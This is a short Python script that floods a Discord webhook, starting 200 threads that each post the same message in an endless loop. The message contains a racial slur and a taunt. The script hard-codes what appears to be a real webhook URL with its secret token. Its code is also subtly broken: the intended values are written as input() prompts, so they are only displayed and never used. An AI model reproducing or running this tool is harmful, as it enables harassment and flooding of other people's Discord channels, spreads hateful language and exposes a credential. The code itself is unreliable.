import time, requests, pyfiglet, threading
print(pyfiglet.figlet_format("KINGMAN"))

msg = input("Get fucking pwned by memtar and balls out niggas easy webhook i made incase my mod got removed")
webhook = input("https://discord.com/api/webhooks/1377803501836566561/tWg813LN7J_wWpgTwlKD2KCbRxKOFd98urxfLjx0aWaxQKwRsAtJoJH_M7hQ5AAXioiQ")
th = int(input('200'))
sleep = int(input("2"))
def spam():
    while True:
        try:
            data = requests.post(webhook, json={'content': msg})
            if data.status_code == 204:
                print(f"Sent MSG {msg}")
        except:
            print("Bad Webhook :" + webhook)
        time.sleep(sleep)
    
for x in range(th):
    t = threading.Thread(target = spam)
    t.start()
